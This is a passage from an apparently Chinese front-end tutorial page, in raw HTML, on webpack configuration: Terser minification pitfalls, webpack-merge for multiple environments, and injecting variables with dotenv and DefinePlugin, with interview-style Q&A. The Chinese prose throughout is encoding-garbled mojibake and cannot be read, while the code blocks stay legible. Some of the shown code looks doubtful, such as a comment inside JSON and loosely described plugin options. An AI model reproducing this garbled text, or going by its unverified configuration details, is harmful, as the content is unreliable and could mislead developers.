bytes</td></tr></tbody></table><p><strong>å‹ç¼©é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) Source Mapå¤±æ•ˆé—®é¢˜</p><p>ç°è±¡ï¼šç”Ÿäº§ç¯å¢ƒé”™è¯¯å †æ ˆæ— æ³•æ˜ å°„æºç </p><p>è§£å†³ï¼šé…ç½®ç”Ÿæˆç²¾å‡†Source Map</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Terseré…ç½®</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>  <span class="hljs-attr">sourceMap</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¿…é¡»å¯ç”¨</span><br>&#125;)<br><br><span class="hljs-comment">// Webpackæ€»é…ç½®</span><br><span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;hidden-source-map&#x27;</span> <span class="hljs-comment">// ç”Ÿæˆmapæ–‡ä»¶ä½†ä¸æš´éœ²ç»™æµè§ˆå™¨</span><br></code></pre></td></tr></table></figure><p>(2) æ··æ·†å¯¼è‡´æ ·å¼å¼‚å¸¸</p><p>æ¡ˆä¾‹ï¼šCSS Modulesç±»åè¢«å‹ç¼©ç ´å</p><p>è§£å†³ï¼šå®‰å…¨æ··æ·†é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>  <span class="hljs-attr">terserOptions</span>: &#123;<br>    <span class="hljs-attr">mangle</span>: &#123;<br>      <span class="hljs-attr">properties</span>: &#123;<br>        <span class="hljs-attr">reserved</span>: [<span class="hljs-string">&#x27;_className&#x27;</span>] <span class="hljs-comment">// ä¿ç•™ç‰¹å®šå±æ€§å</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>(3) å‹ç¼©å¼•å‘æ¡†æ¶Bug</p><p>æ¡ˆä¾‹ï¼šVueå“åº”å¼ç³»ç»Ÿå› å±æ€§æ··æ·†å¤±æ•ˆ</p><p>è§£å†³ï¼šç¦ç”¨å±æ€§æ··æ·†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">mangle</span>: &#123;<br>  <span class="hljs-attr">properties</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// å…³é—­å±æ€§æ··æ·†</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§ä¼˜åŒ–å®è·µ</strong></p><p>(1) å·®å¼‚åŒ–å‹ç¼©ç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒåŠ¨æ€é…ç½®</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimizer</span>: env.<span class="hljs-property">production</span> ? [<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123; <span class="hljs-comment">/* ç”Ÿäº§é…ç½® */</span> &#125;),<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">CssMinimizerPlugin</span>()<br>    ] : []<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) å®šåˆ¶åˆ é™¤è§„åˆ™ï¼ˆå¦‚å¤šè¯­è¨€é¡¹ç›®ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ é™¤ç‰¹å®šè¯­è¨€çš„ä»£ç å—</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>  <span class="hljs-attr">terserOptions</span>: &#123;<br>    <span class="hljs-attr">compress</span>: &#123;<br>      <span class="hljs-attr">global_defs</span>: &#123;<br>        <span class="hljs-comment">// åˆ é™¤__DEV__ä»£ç å—</span><br>        <span class="hljs-attr">__DEV__</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-comment">// åˆ é™¤ä¸­æ–‡æ³¨é‡Šï¼ˆéœ€é…åˆè‡ªå®šä¹‰æ’ä»¶ï¼‰</span><br>        <span class="hljs-attr">__LANG_CN__</span>: <span class="hljs-literal">false</span>  <br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>(3) å‹ç¼©ç‡ç›‘æ§ï¼ˆæ¥å…¥CIï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…ä½“ç§¯åˆ†ææ’ä»¶</span><br>npm install --save-dev size-limit<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JSON"># package.json<br><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;size-limit&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>é¢è¯•è¦ç‚¹</strong></p><p>Q1ï¼šTerserä¸UglifyJSæ ¸å¿ƒåŒºåˆ«</p><p>Terseræ”¯æŒES6+è¯­æ³•ã€å¤šè¿›ç¨‹å‹ç¼©ã€æ›´ç²¾å‡†çš„Tree Shaking</p><p>Q2ï¼šå¦‚ä½•ä¿ç•™ç‰¹å®šæ³¨é‡Šï¼Ÿ</p><p>Terserä¸­è®¾ç½®<code>format.comments: /@license/iï¼Œcssnanoç”¨discardComments: &#123; remove: (comment) =&gt; !comment.includes(&#39;!&#39;) &#125;</code></p><p>Q3ï¼šå‹ç¼©å¯¼è‡´çº¿ä¸ŠBugçš„æ’æŸ¥æ€è·¯</p><p>æ­¥éª¤ï¼š</p><ul><li>ç¡®è®¤Source Mapå¯è¿˜åŸå †æ ˆ</li><li>æ£€æŸ¥æ··æ·†é…ç½®æ˜¯å¦å½±å“æ¡†æ¶è¿è¡Œæ—¶</li><li>é€šè¿‡<code>/*#__PURE__*/</code>æ ‡è®°å‰¯ä½œç”¨å‡½æ•°</li></ul><h1 id="å››ã€é«˜çº§ç‰¹æ€§ä¸å·¥ç¨‹åŒ–"><a href="#å››ã€é«˜çº§ç‰¹æ€§ä¸å·¥ç¨‹åŒ–" class="headerlink" title="å››ã€é«˜çº§ç‰¹æ€§ä¸å·¥ç¨‹åŒ–"></a>å››ã€é«˜çº§ç‰¹æ€§ä¸å·¥ç¨‹åŒ–</h1><h2 id="4-1-ç¯å¢ƒåŒºåˆ†ä¸åŠ¨æ€é…ç½®"><a href="#4-1-ç¯å¢ƒåŒºåˆ†ä¸åŠ¨æ€é…ç½®" class="headerlink" title="4.1 ç¯å¢ƒåŒºåˆ†ä¸åŠ¨æ€é…ç½®"></a>4.1 ç¯å¢ƒåŒºåˆ†ä¸åŠ¨æ€é…ç½®</h2><h3 id="4-1-1-åŸºäºwebpack-mergeçš„å¤šç¯å¢ƒé…ç½®"><a href="#4-1-1-åŸºäºwebpack-mergeçš„å¤šç¯å¢ƒé…ç½®" class="headerlink" title="4.1.1 åŸºäºwebpack-mergeçš„å¤šç¯å¢ƒé…ç½®"></a>4.1.1 åŸºäº<code>webpack-merge</code>çš„å¤šç¯å¢ƒé…ç½®</h3><p><strong>æ ¸å¿ƒä½œç”¨</strong></p><p>é€šè¿‡åˆ†ç¦»ç¯å¢ƒé…ç½®å®ç°å®‰å…¨ã€é«˜æ•ˆçš„æ„å»ºç®¡ç†ï¼Œé¿å…ç”Ÿäº§ç¯å¢ƒè¯¯ç”¨å¼€å‘é…ç½®ã€‚</p><p><strong>åŸºç¡€ç›®å½•ç»“æ„</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">config/<br>â”œâ”€â”€ webpack.common.js    <span class="hljs-comment"># é€šç”¨é…ç½®ï¼ˆå…¥å£/è¾“å‡º/å…¬å…±è§„åˆ™ï¼‰</span><br>â”œâ”€â”€ webpack.dev.js       <span class="hljs-comment"># å¼€å‘é…ç½®ï¼ˆdevServer/çƒ­æ›´æ–°ï¼‰</span><br>â””â”€â”€ webpack.prod.js      <span class="hljs-comment"># ç”Ÿäº§é…ç½®ï¼ˆå‹ç¼©/ä»£ç åˆ†å‰²ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒåˆå¹¶æ“ä½œ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.dev.js</span><br><span class="hljs-keyword">const</span> &#123; merge &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);<br><span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.common.js&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(common, &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;development&#x27;</span>,<br>  <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;eval-cheap-module-source-map&#x27;</span>,<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">hot</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.prod.js</span><br><span class="hljs-keyword">const</span> &#123; merge &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);<br><span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.common.js&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(common, &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>,<br>  <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;hidden-source-map&#x27;</span>,<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">minimizer</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>()]<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>é…ç½®åˆå¹¶è§„åˆ™è§£æ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ™ºèƒ½è¦†ç›–</td><td align="left">åŒåå±æ€§ç›´æ¥è¦†ç›–ï¼ˆå¦‚output.pathï¼‰</td></tr><tr><td align="left">æ•°ç»„åˆå¹¶</td><td align="left">å¯¹module.rulesç­‰æ•°ç»„æ‰§è¡Œconcatæ“ä½œï¼ˆéè¦†ç›–ï¼ï¼‰</td></tr><tr><td align="left">å¯¹è±¡æ·±åº¦åˆå¹¶</td><td align="left">åµŒå¥—å¯¹è±¡é€’å½’åˆå¹¶ï¼ˆå¦‚optimization.splitChunks.cacheGroupsï¼‰</td></tr><tr><td align="left">ç‰¹æ®Šå±æ€§å¤„ç†</td><td align="left">pluginsæ•°ç»„é€šè¿‡æ„é€ å‡½æ•°åç§°å»é‡åˆå¹¶</td></tr></tbody></table><blockquote><p>é¿å‘æç¤ºï¼šè‹¥éœ€å®Œå…¨è¦†ç›–æ•°ç»„ï¼ˆå¦‚pluginsï¼‰ï¼Œä½¿ç”¨ merge.withCustomize è‡ªå®šä¹‰è§„åˆ™</p></blockquote><p><strong>ä¼ä¸šçº§å¤šç¯å¢ƒæ‰©å±•</strong></p><p>(1) åŠ¨æ€ç¯å¢ƒå˜é‡æ³¨å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// package.json</span><br><span class="hljs-string">&quot;scripts&quot;</span>: &#123;<br>  <span class="hljs-string">&quot;build:prod&quot;</span>: <span class="hljs-string">&quot;NODE_ENV=production webpack --config config/webpack.prod.js&quot;</span>,<br>  <span class="hljs-string">&quot;build:stage&quot;</span>: <span class="hljs-string">&quot;NODE_ENV=staging webpack --config config/webpack.prod.js&quot;</span><br>&#125;<br><br><span class="hljs-comment">// webpack.prod.js</span><br><span class="hljs-keyword">const</span> env = process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span>; <span class="hljs-comment">// &#x27;production&#x27; æˆ– &#x27;staging&#x27;</span><br></code></pre></td></tr></table></figure><p>(2) ç¯å¢ƒä¸“å±æ’ä»¶ç¤ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä»…ç”Ÿäº§ç¯å¢ƒå¯ç”¨Bundleåˆ†æ</span><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  prodConfig.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜é˜¶åˆå¹¶æŠ€å·§</strong></p><p>(1) æ¡ä»¶åˆå¹¶ï¼ˆæ ¹æ®ç¯å¢ƒå˜é‡ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(common, &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    process.<span class="hljs-property">env</span>.<span class="hljs-property">USE_MOCK</span> &amp;&amp; <span class="hljs-keyword">new</span> <span class="hljs-title class_">MockPlugin</span>() <span class="hljs-comment">// æ¡ä»¶æ·»åŠ æ’ä»¶</span><br>  ].<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) è‡ªå®šä¹‰åˆå¹¶è§„åˆ™</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; customizeArray &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(&#123;<br>  <span class="hljs-attr">customizeArray</span>: <span class="hljs-title function_">customizeArray</span>(&#123;<br>    <span class="hljs-string">&#x27;module.rules&#x27;</span>: <span class="hljs-string">&#x27;replace&#x27;</span> <span class="hljs-comment">// å®Œå…¨æ›¿æ¢rulesæ•°ç»„è€Œéåˆå¹¶</span><br>  &#125;)<br>&#125;)(common, devConfig);<br></code></pre></td></tr></table></figure><p>(3) TypeScriptç±»å‹æ”¯æŒ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs TypeScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Configuration</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;webpack&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; merge &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;webpack-merge&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">common</span>: <span class="hljs-title class_">Configuration</span> = &#123; ... &#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">dev</span>: <span class="hljs-title class_">Configuration</span> = &#123; ... &#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">merge</span>(common, dev); <span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼å®Œæ•´ç±»å‹</span><br></code></pre></td></tr></table></figure><p><strong>é¢è¯•æ ¸å¿ƒè¦ç‚¹</strong></p><p>Qï¼šä¸ºä½•ä¸ç”¨ Object.assign åˆå¹¶é…ç½®ï¼Ÿ</p><p>Object.assign ä»…æµ…å±‚åˆå¹¶ï¼Œä¼šç ´ååµŒå¥—ç»“æ„ï¼ˆå¦‚ module.rulesï¼‰ï¼Œè€Œ webpack-merge æ”¯æŒæ·±åº¦é€’å½’åˆå¹¶</p><p>Qï¼šå¤šç¯å¢ƒé…ç½®å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„éœ²ï¼Ÿ</p><ul><li>ç”Ÿäº§ç¯å¢ƒç¦ç”¨ devtool: eval ç­‰ä¸å®‰å…¨Source Map</li><li>é€šè¿‡ DefinePlugin æ›¿æ¢APIå¯†é’¥ç­‰æ•æ„Ÿå˜é‡</li><li>å¼€å‘é…ç½®ç»ä¸åŒ…å«å‹ç¼©å¯†é’¥ç­‰ç”Ÿäº§å‡­æ®</li></ul><p>Qï¼šå¦‚ä½•éªŒè¯é…ç½®åˆå¹¶ç»“æœï¼Ÿ</p><p>æ–¹æ¡ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx webpack --config config/webpack.prod.js --json &gt; stats.json<br></code></pre></td></tr></table></figure><p>åˆ†æç”Ÿæˆçš„stats.jsonæ–‡ä»¶ç¡®è®¤æœ€ç»ˆé…ç½®</p><h3 id="4-1-2-ç¯å¢ƒå˜é‡æ³¨å…¥ï¼ˆdotenvä¸DefinePluginç»“åˆï¼‰"><a href="#4-1-2-ç¯å¢ƒå˜é‡æ³¨å…¥ï¼ˆdotenvä¸DefinePluginç»“åˆï¼‰" class="headerlink" title="4.1.2 ç¯å¢ƒå˜é‡æ³¨å…¥ï¼ˆdotenvä¸DefinePluginç»“åˆï¼‰"></a>4.1.2 ç¯å¢ƒå˜é‡æ³¨å…¥ï¼ˆ<code>dotenv</code>ä¸<code>DefinePlugin</code>ç»“åˆï¼‰</h3><p><strong>åŸºç¡€å·¥ä½œæµç¨‹</strong></p><pre class="mermaid">graph LR  A[.envæ–‡ä»¶] --> B[dotenvè§£æ] --> C[DefinePluginè½¬æ¢] --> D[ä»£ç ä¸­process.envè®¿é—®]</pre><p><strong>æ ‡å‡†å®æ–½æ­¥éª¤</strong></p><p>(1) å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install dotenv-webpack --save-dev<br></code></pre></td></tr></table></figure><p>(2) åˆ›å»ºç¯å¢ƒæ–‡ä»¶</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># .env.development</span><br><span class="hljs-attr">API_BASE_URL</span> = https://dev.example.com<br><span class="hljs-attr">DEBUG_MODE</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">SENTRY_DSN</span> = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment"># å¼€å‘ç¯å¢ƒä¸å¯ç”¨ç›‘æ§</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># .env.production</span><br><span class="hljs-attr">API_BASE_URL</span> = https://api.example.com<br><span class="hljs-attr">DEBUG_MODE</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">SENTRY_DSN</span> = <span class="hljs-string">&#x27;https://key@sentry.io/project&#x27;</span> <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒç›‘æ§</span><br></code></pre></td></tr></table></figure><p>(3) Webpacké…ç½®é›†æˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Dotenv</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv-webpack&#x27;</span>);<br><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dotenv</span>(&#123;<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">`.env.<span class="hljs-subst">$&#123;env.mode&#125;</span>`</span>, <span class="hljs-comment">// æ ¹æ®modeåŠ è½½å¯¹åº”æ–‡ä»¶</span><br>      <span class="hljs-attr">systemvars</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// å…¼å®¹ç³»ç»Ÿç¯å¢ƒå˜é‡</span><br>      <span class="hljs-attr">safe</span>: <span class="hljs-literal">true</span>                 <span class="hljs-comment">// å¦‚æœä¸å­˜åœ¨æ–‡ä»¶ä¸æŠ¥é”™</span><br>    &#125;),<br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">DefinePlugin</span>(&#123;<br>      <span class="hljs-string">&#x27;process.env.DEBUG_MODE&#x27;</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">DEBUG_MODE</span>)<br>    &#125;)<br>  ]<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨é˜²æŠ¤æœºåˆ¶</strong></p><p>(1) å‰ç«¯ç¯å¢ƒå˜é‡ç™½åå•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åªå…è®¸ç‰¹å®šå‰ç¼€å˜é‡æ³¨å…¥å‰ç«¯ä»£ç </span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Dotenv</span>(&#123;<br>  <span class="hljs-attr">allow</span>: [<span class="hljs-string">&#x27;API_&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC_&#x27;</span>] <span class="hljs-comment">// ç¦æ­¢æ³¨å…¥DB_PASSWORDç­‰æ•æ„Ÿå˜é‡</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) .gitignoreä¿æŠ¤æ•æ„Ÿæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gitignore"># ç¦æ­¢æäº¤ç”Ÿäº§ç¯å¢ƒæ–‡ä»¶<br>.env.production<br>.env.staging<br></code></pre></td></tr></table></figure><p>(3) CI&#x2F;CDç¯å¢ƒå˜é‡æ‰˜ç®¡</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># GitHub Actionsç¤ºä¾‹</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">production</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">API_BASE_URL:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.PROD_API_URL</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">SENTRY_DSN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.SENTRY_DSN</span> <span class="hljs-string">&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>æ¡†æ¶é›†æˆæ–¹æ¡ˆ</strong></p><p>(1) React (create-react-app)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç›´æ¥ä½¿ç”¨REACT_APP_å‰ç¼€å˜é‡</span><br><span class="hljs-comment">// .env</span><br><span class="hljs-variable constant_">REACT_APP_API_URL</span>=<span class="hljs-attr">https</span>:<span class="hljs-comment">//api.example.com</span><br><br><span class="hljs-comment">// ç»„ä»¶å†…è®¿é—®</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">REACT_APP_API_URL</span>);<br></code></pre></td></tr></table></figure><p>(2) Vue CLI</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// vue.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">chainWebpack</span>: <span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>    config.<span class="hljs-title function_">plugin</span>(<span class="hljs-string">&#x27;define&#x27;</span>).<span class="hljs-title function_">tap</span>(<span class="hljs-function"><span class="hljs-params">args</span> =&gt;</span> &#123;<br>      args[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;process.env&#x27;</span>].<span class="hljs-property">API_URL</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">API_URL</span>)<br>      <span class="hljs-keyword">return</span> args<br>    &#125;)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§å®è·µæŠ€å·§</strong></p><p>(1) ç±»å‹æ”¯æŒ (TypeScript)</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 